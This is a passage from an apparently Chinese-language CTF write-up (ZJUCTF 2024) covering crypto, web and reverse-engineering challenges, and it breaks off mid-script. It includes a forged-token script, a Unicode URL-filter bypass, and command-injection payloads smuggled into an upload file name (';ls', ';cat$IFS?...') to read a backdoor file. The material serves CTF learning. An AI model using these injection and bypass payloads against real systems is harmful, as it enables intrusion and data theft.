<span class="hljs-number">30013758663076066877713479338691268354899117645445901521662513922052773749395722214090463347248196981868060239786749190266829133470588046958650363148592192357743453783999383200266694850576232013366482175580400126504924153112985830671791571729150276552617782355703038489520393441340713706112576543244470787929038348393779800947179266079330697886117577995873112270474905451612688195298847844226775663235117316316233884464539170131705812430540592713821720299545018169679141879516593359119078495699996765358693970850371204734231497643516531729414382001386014762945378114870937450813766645634470171843375886718590614087224</span>]<br>A = Matrix([<br>    [<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">0</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">1</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">2</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">3</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">4</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,-n],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,-s]<br>    ]<br>)<br>B = A.LLL()<br><span class="hljs-built_in">print</span>(B)<br>x = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>][:<span class="hljs-number">5</span>]]<br>new_s = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ai = a[i]<br>    xi = x[i]<br>    new_s += ai * xi<br><span class="hljs-built_in">print</span>(new_s%n == s)<br>ans = sha256(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x]).encode()).hexdigest()<br>flag = <span class="hljs-string">f&quot;ZJUCTF&#123;&#123;<span class="hljs-subst">&#123;ans&#125;</span>&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/29.png"></p></li></ul><h2 id="fib1">fib1</h2><ul><li>æ ¹æ®é¢˜ç›®<span class="math display">\[ f(n,p)= (F(n) \% p, F(n+1) \% p) \]</span> åªè¦åˆ©ç”¨å¥½æ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ€§è´¨å°±å¯ä»¥è§£å†³ï¼›</li><li>çŸ¥é“ $ F(a+b) = F(b) F(a+1) + F(b-1) F(a)$ å°±å¯ä»¥æ ¹æ® $ f(a,p),f(b,p) $ æ±‚ $ f(a+b,p) $ï¼›</li><li>çŸ¥é“ $F(2n) = F(n) ( 2F(n+1) - F(n) ) $ å’Œ $ F(2n+1) = F(n+1)^2 + F(n)^2 $ å¿«é€Ÿå€å¢å°±å¯ä»¥æ ¹æ® $ f(n,p) $ æ±‚ $ f(k n,p) $ï¼›</li><li>ç”±äº p æ˜¯è´¨æ•°ï¼Œå°±å¯ä»¥é€†å‘åŠ æ³•è¿‡ç¨‹åšå‡æ³•; <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> is_prime,invert<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">62562</span>)<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibadd</span>(<span class="hljs-params">fib1,fib2,p</span>):<br>    <span class="hljs-keyword">return</span> [(fib2[<span class="hljs-number">0</span>]*fib1[<span class="hljs-number">1</span>]+((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p)*fib1[<span class="hljs-number">0</span>])%p,(fib2[<span class="hljs-number">1</span>]*fib1[<span class="hljs-number">1</span>]+fib2[<span class="hljs-number">0</span>]*fib1[<span class="hljs-number">0</span>])%p]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibsub</span>(<span class="hljs-params">fib2,res,p</span>):<br>    fib1 = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">assert</span> is_prime(p)<br>    tmp1 = (res[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">1</span>]-res[<span class="hljs-number">1</span>]*fib2[<span class="hljs-number">0</span>])%p<br>    tmp2 = (((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p)*fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>])%p<br>    fib1[<span class="hljs-number">0</span>] = (invert(tmp2,p)*tmp1)%p<br>    tmp1 = (res[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>]-res[<span class="hljs-number">1</span>]*((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p))%p<br>    tmp2 = (fib2[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>]-fib2[<span class="hljs-number">1</span>]*((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p))%p<br>    fib1[<span class="hljs-number">1</span>] = (invert(tmp2,p)*tmp1)%p<br>    <span class="hljs-keyword">return</span> fib1<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibmul2</span>(<span class="hljs-params">fib,p</span>):<br>    <span class="hljs-keyword">return</span> [(fib[<span class="hljs-number">0</span>]*(<span class="hljs-number">2</span>*fib[<span class="hljs-number">1</span>]-fib[<span class="hljs-number">0</span>]))%p,(<span class="hljs-built_in">pow</span>(fib[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>,p)+<span class="hljs-built_in">pow</span>(fib[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,p))%p]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibmulk</span>(<span class="hljs-params">fib,k,p</span>):<br>    res = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>    now = fib.copy()<br>    <span class="hljs-keyword">while</span> k!=<span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># print(now,res,k,k%2)</span><br>        <span class="hljs-keyword">if</span> k%<span class="hljs-number">2</span>:<br>            res = fibadd(res,now,p)<br>        now = fibmul2(now,p)<br>        k = k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;now running : <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">f&quot;Round <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/10&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;now you know:\n&quot;</span>)<br>    p = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;p = &quot;</span>):-<span class="hljs-number">1</span>])<br>    k = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;k = &quot;</span>):-<span class="hljs-number">1</span>])<br>    fib_a = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;fib(a, p) = (&quot;</span>):-<span class="hljs-number">2</span>].split(<span class="hljs-string">&quot;,&quot;</span>)]<br>    fib_b = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;fib(b, p) = (&quot;</span>):-<span class="hljs-number">2</span>].split(<span class="hljs-string">&quot;,&quot;</span>)]<br>    io.recv()<br>    fib_ab = fibadd(fib_a,fib_b,p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_ab[<span class="hljs-number">0</span>]*p+fib_ab[<span class="hljs-number">1</span>]).encode())<br>    io.recv()<br>    fib_ak = fibmulk(fib_a,k,p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_ak[<span class="hljs-number">0</span>]*p+fib_ak[<span class="hljs-number">1</span>]).encode())<br>    <span class="hljs-keyword">assert</span> fibadd(fibsub(fib_a,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],p),fib_a,p)==[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>    io.recv()<br>    fib_c = fibsub(fib_a,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_c[<span class="hljs-number">0</span>]*p+fib_c[<span class="hljs-number">1</span>]).encode())<br><br>io.interactive()<br><br><span class="hljs-comment"># ZJUCTF&#123;fibonacci_sequence_mod_n_is_a_kind_of_group&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/33.png"></li></ul><h1 id="web"><strong>Web</strong></h1><p>è¿˜æ˜¯ä¸å¤ªä¼šwebçš„é¢˜ç›®ï¼Œæœ‰äº›é¢˜ç›®éƒ½æ˜¯ç½‘ä¸Šæœ‰ç±»ä¼¼é¢˜è§£çš„ğŸ¥²</p><h2 id="easy-pentest">easy pentest</h2><ul><li>ä»<a href="https://help.aliyun.com/zh/oss/developer-reference/install-ossutil?spm=a2c4g.11186623.0.0.79b841e607DL3S#concept-303829">é˜¿é‡Œäº‘</a>ä¸‹è½½å·¥å…·å¹¶æ ¹æ®é¢˜ç›®æ–‡ä»¶é…ç½®ï¼š <img src="/img/zjuctf2024/3.png"></li><li>è¿è¡Œ<code>./ossutil64 cp oss://oss-test-qazxsw/fffffflllllaaaagggg.txt ./</code>å¾—åˆ°æ–‡ä»¶ï¼Œflagæ˜¯<code>flag&#123;99b87fa89d7e147c42e709dcd378e03e&#125;</code></li></ul><h2 id="easy-jwt">easy JWT</h2><ul><li>ä»”ç»†çœ‹äº†ä»£ç ï¼Œç›®æ ‡æ˜¯è¾“å…¥tokenä½¿å¾—"role"å˜ä¸º"admin"ï¼Œä½†æ˜¯ä¸çŸ¥é“secretï¼Œæ‰€ä»¥æ²¡æ³•é€šè¿‡ç­¾åæ£€æµ‹ï¼Œæˆ‘ä¸€ç›´æƒ³ç€æ„é€ json.loadæ¥çªƒå–secretï¼Œä½†æ˜¯ç›´åˆ°çœ‹åˆ°<a href="https://rwandi-ctf.github.io/LACTF2024/jason-web-token/">åšå®¢</a>å‘ç°åªè¦è¾“å…¥å¾ˆå¤§çš„ageå°±èƒ½ä½¿å¾—salted_secretå˜ä¸º<code>inf</code>ï¼Œäºæ˜¯å¯ä»¥é€šè¿‡æ£€æµ‹ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br>secret = <span class="hljs-built_in">int</span>.from_bytes(os.urandom(<span class="hljs-number">128</span>), <span class="hljs-string">&quot;big&quot;</span>)<br>hash_ = <span class="hljs-keyword">lambda</span> a: hashlib.sha256(a.encode()).hexdigest()<br><br>data = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;admin-owo&quot;, &quot;age&quot;: 1e1000, &quot;role&quot;: &quot;admin&quot;, &quot;timestamp&quot;: 1729240220&#125;&#x27;</span><br>userinfo = json.loads(data)<br>salted_secret = (secret ^ userinfo[<span class="hljs-string">&quot;timestamp&quot;</span>]) + userinfo[<span class="hljs-string">&quot;age&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(hash_(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>))<br>signature = hash_(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>)<br><br>payload = data.encode().<span class="hljs-built_in">hex</span>() + <span class="hljs-string">&quot;.&quot;</span> + signature<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://55a4ef54.r23.cpolar.top/img&quot;</span>  <span class="hljs-comment">#å†…ç½‘ç©¿é€åœ°å€</span><br>cookies = &#123;<br>    <span class="hljs-string">&quot;token&quot;</span>: payload<br>&#125;<br>response = requests.get(url, cookies=cookies)<br><span class="hljs-built_in">print</span>(response.content)<br><span class="hljs-comment"># ZJUCTF&#123;COOKI3_dE$i9n_5HOU1d_fo1low_BEs7_PR@cT1Ce|5Ry_F0r_unExPeCT3D_s0lVe_T.T&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/22.png"></li></ul><h2 id="shanque">shanque</h2><ul><li>ç›®æ ‡æ˜¯åœ¨urlçš„æ¡†å†…è¾“å…¥<code>http://here-is.your.flaaaaa4g.url</code>ï¼Œä½†æ˜¯ä»£ç å¯¹urlè¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸èƒ½æœ‰é‡å¤å­—ç¬¦ï¼Œä¸”ä¸èƒ½æœ‰<code>here-is.your.flaaaaa4g.url</code>ï¼Œäºæ˜¯å°±æƒ³åˆ°äº†unicodeçš„ç‰¹æ®Šå­—ç¬¦ä¼šè¢«urlæ­£ç¡®è§£æ: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> normalize<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br>target = <span class="hljs-string">&quot;http://here-is.yourã€‚flaaaaa4gã€‚url&quot;</span><br><br>lst = <span class="hljs-built_in">list</span>(target)<br>dic = defaultdict(<span class="hljs-built_in">list</span>)<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x110000</span>):<br>        <span class="hljs-keyword">if</span> normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">chr</span>(i)) == char:<br>            dic[char].append(<span class="hljs-built_in">chr</span>(i))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dic[char]) &gt; <span class="hljs-number">9</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(dic)<br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:<br>    res+=dic[i][<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">del</span> dic[i][<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure></li><li>åœ¨æœ¬åœ°è·‘å‘ç°urlå‰é¢äº”ä¸ªå­—ç¬¦ä¸èƒ½ä¸ºç‰¹æ®Šå­—ç¬¦ï¼Œäºæ˜¯å°±æƒ³åˆ°äº†å¤§å°å†™ç»•è¿‡ï¼Œæ„é€ å‡ºpayloadï¼š<code>HtTp:â‚•áµ‰Ê³â‚‘ï¹£áµ¢Å¿ï¼Ê¸Âºáµ˜áµ£ï½¡á¶ Ë¡Âªáµƒâ‚â“ï½â´áµã€‚áµ¤â“¡â‚—</code> <img src="/img/zjuctf2024/43.png"></li></ul><h2 id="upload">upload</h2><ul><li>é¦–å…ˆæ‰“å¼€ç½‘é¡µï¼Œå‘ç°è¢«é‡å®šå‘åˆ°å¾®ä¿¡å…¬ä¼—å·ï¼Œç”¨burpsuiteæŠ“åŒ…ï¼Œè·³å‡ºä¸€å¼€å§‹çš„ç½‘å€é‡å®šå‘ï¼š <img src="/img/zjuctf2024/44.png"></li><li>å‘ç°æœ‰ä¸ªuploadç•Œé¢ï¼Œå¯ä»¥ä¸Šä¼ å›¾ç‰‡ï¼Œé€šè¿‡æ›´æ”¹æ–‡ä»¶åç­‰æ‰‹æ®µï¼Œå‘ç°å¯¹æ–‡ä»¶ç±»å‹çš„æ£€æµ‹æ˜¯ç”±æ–‡ä»¶å¤´å†³å®šçš„ï¼Œè·Ÿæ–‡ä»¶ååç¼€æ— å…³ï¼Œè¿™æ—¶å€™åˆ°è¿™å°±å¡ä½äº†ï¼Œå› ä¸ºå°±ç®—ä¸Šä¼ æœ¨é©¬å›¾ç‰‡ä¹Ÿä¸çŸ¥é“å›¾ç‰‡è·¯å¾„ï¼Œå¯èƒ½å­˜åˆ°ç³»ç»Ÿçš„æŸä¸ªæ–‡ä»¶å¤¹ä¸‹é¢ï¼Œå¹¶ä¸æ˜¯åœ¨ç½‘é¡µä¸Šå¯ä»¥è®¿é—®çš„ï¼›</li><li>åæ¥é—®äº†å‡ºé¢˜äººï¼Œä»–è®©æˆ‘å¤šä¸Šä¼ ç‚¹ä¸ä¸€æ ·çš„å›¾ç‰‡è¯•è¯•ï¼Œæ¥ç€æˆ‘å°±å‘ç°äº†å¯ç–‘çš„åœ°æ–¹ï¼Œä¸Šä¼ åˆ°æŸå¼ å›¾ç‰‡æ—¶çªç„¶ç½‘é¡µè¿”å›äº†<code>special char found in the file name.</code>ï¼Œç½‘é¡µç«Ÿç„¶æ£€æµ‹äº†æ–‡ä»¶åï¼Œè¿™å°±å¾ˆåŒªå¤·æ‰€æ€ã€‚äºæ˜¯æˆ‘ä¸åœçš„ä¿®æ”¹æ–‡ä»¶åï¼Œç»ˆäºï¼<ul><li>æ­£å¸¸çš„ä¸Šä¼ å›¾ç‰‡æ˜¯è¿™æ ·çš„ï¼š <img src="/img/zjuctf2024/45.png"></li><li>æ–‡ä»¶åä¸ºç©ºä¼šæŠ¥è¿™ä¸ªé”™: <img src="/img/zjuctf2024/46.png"></li><li>æ–‡ä»¶åä¸º<code>/</code>ä¼šæŠ¥è¿™ä¸ªé”™: <img src="/img/zjuctf2024/47.png"></li><li>æ–‡ä»¶åä¸º<code>'</code>ä¼šè¿”å›ç©º: <img src="/img/zjuctf2024/48.png"></li><li>ä¸ºä»€ä¹ˆä¼šè¿”å›ç©ºå‘¢ï¼Œéš¾é“æ‰§è¡Œäº†ä»€ä¹ˆæŒ‡ä»¤ï¼Ÿæ˜¯SQL/PHPï¼Œè¿˜æ˜¯SHELLï¼Ÿäºæ˜¯æˆ‘åˆå°è¯•äº†å„ç§æ–‡ä»¶åï¼Œç›´åˆ°è¾“å…¥<code>;ls</code>æ—¶å‘ç°ç«Ÿç„¶æœ‰ç»“æœï¼š <img src="/img/zjuctf2024/49.png"></li></ul></li><li>çœ‹åˆ°äº†è¿™é“é¢˜çš„ç›®æ ‡ï¼Œå°±æ˜¯æ‹¿åˆ°<code>b4ckD00000ooor.php</code>é‡Œé¢çš„å†…å®¹ï¼Œå†æ¢³ç†æ•´ä¸ªæ€è·¯ï¼ŒçŒœæµ‹å‡ºé¢˜äººæ˜¯å°†è¿™å¼ å›¾ç‰‡å­˜åˆ°äº†ç³»ç»Ÿçš„æŸä¸ªåœ°æ–¹ï¼Œæœ€ååœ¨ç½‘ç«™ä¸Šè¿”å›å›¾ç‰‡æ—¶ï¼Œæ˜¯ç”¨ç±»ä¼¼shellçš„æŒ‡ä»¤è¯»å–äº†è¯¥è·¯å¾„çš„æ–‡ä»¶å†…å®¹å¹¶è¿›è¡Œbase64ç¼–ç å†è¿”å›çš„;</li><li>ä½†æ˜¯å‡ºé¢˜äººé™åˆ¶äº†ç©ºæ ¼ï¼Œä¹Ÿé™åˆ¶äº†ä¸€å¯¹<code>$$</code>ï¼Œä¹Ÿä¸èƒ½ç”¨<code>$IFS$9</code>ç»•è¿‡;</li><li>å°è¯•å¤šæ¬¡åå‘ç°å¯ä»¥ç”¨é€šé…ç¬¦<code>?</code>ç»•è¿‡ï¼Œä½¿ç”¨<code>;cat$IFS?4ckD00000ooor.php</code>ï¼Œæ‹¿åˆ°flag(ZJUCTF{Ye5_We1l_inj3C.t10N!!})ï¼š <img src="/img/zjuctf2024/50.png"></li></ul><h1 id="reverse"><strong>Reverse</strong></h1><p>ä¼šåšçš„reverseé¢˜éƒ½ç®—æ¯”è¾ƒç®€å•çš„é€åˆ†é¢˜ğŸ«¥</p><h2 id="rev1">rev1</h2><ul><li>æ‰“å¼€äº²çˆ±çš„idaå¤§äººï¼Œçœ‹åˆ°å…³é”®æ¯”è¾ƒä»£ç ï¼ˆå…¶ä¸­v9[i+27]æ˜¯ä½ è¾“å…¥çš„æ•°æ®ï¼‰ <img src="/img/zjuctf2024/12.png"></li><li>é‚£ä¹ˆç®€å•äº†ï¼Œæ‰“å¼€gdbå°†æ–­ç‚¹è®¾åœ¨æ¯”è¾ƒè¯­å¥ï¼Œçœ‹å¯„å­˜å™¨å†…çš„å€¼å°±è¡Œäº†ã€‚å›¾æ–¹ä¾¿æˆ‘è¿˜ç”¨patchå¤§æ³•æŠŠreturn 0ç›¸å…³æ±‡ç¼–æ”¹æˆäº†nopï¼Œè¿™ä¸‹é”™äº†ä¹Ÿä¸ä¼šé€€å‡ºç¨‹åºäº†: <img src="/img/zjuctf2024/13.png"> <img src="/img/zjuctf2024/14.png"></li><li>ç”¨gdbè§£å‡ºflagï¼š <img src="/img/zjuctf2024/15.png"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">li = [<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0x7d</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;rev_is_fun_right?&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="rev2">rev2</h2><ul><li>æ”¾åˆ°idaé‡ŒæŸ¥çœ‹ï¼Œå…¶ä½™éƒ½æ˜¯ç®€å•çš„å¯¹åˆ—è¡¨å†…çš„å€¼åŠ åŠ å‡å‡çš„æ“ä½œå¹¶æ¯”è¾ƒï¼Œå…³é”®åœ¨äºdasæŒ‡ä»¤: <img src="/img/zjuctf2024/19.png"></li></ul>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6e7dedfa" role="button" aria-expanded="false" aria-controls="collapse-6e7dedfa">        <div class="fold-arrow">â–¶</div> das çš„æ“ä½œæ­¥éª¤      </div>      <div class="fold-collapse collapse" id="collapse-6e7dedfa">        <div class="fold-content">          <ul><li>ç›®æ ‡åœºæ™¯ï¼šå½“ä½ ä½¿ç”¨ SUB æŒ‡ä»¤å¯¹ä¸¤ä¸ª BCD æ•°è¿›è¡Œå‡æ³•è¿ç®—æ—¶ï¼Œç»“æœå¯èƒ½ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ BCD ç ã€‚das æŒ‡ä»¤ç”¨äºçº æ­£è¿™ç§æƒ…å†µã€‚</li><li>è°ƒæ•´è§„åˆ™ï¼š<ul><li>å¦‚æœ ALï¼ˆç´¯åŠ å¯„å­˜å™¨çš„ä½ 8 ä½ï¼‰ä¸­çš„ä½ 4 ä½ï¼ˆå³ä¸ªä½ï¼‰å¤§äº 9ï¼Œæˆ–è€…è¾…åŠ©è¿›ä½æ ‡å¿—ï¼ˆAFï¼‰ç½®ä½ï¼Œåˆ™ AL å‡å» 6ï¼Œè°ƒæ•´ä¸ªä½ã€‚</li><li>å¦‚æœ AL çš„é«˜ 4 ä½ï¼ˆå³åä½ï¼‰å¤§äº 9ï¼Œæˆ–è€…è¿›ä½æ ‡å¿—ï¼ˆCFï¼‰ç½®ä½ï¼Œåˆ™ AL å‡å» 0x60ï¼Œè°ƒæ•´åä½ã€‚</li></ul></li></ul>        </div>      </div>    </div><ul><li>æ¨¡æ‹ŸALçš„æ”¹å˜è§„åˆ™ï¼Œç¼–å†™è„šæœ¬å¾—åˆ°flag <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br>numbers = [<br>    <span class="hljs-number">0x30231E3C</span>, <span class="hljs-number">0x794D0D52</span>, <span class="hljs-number">0xDB4F3D42</span>, <span 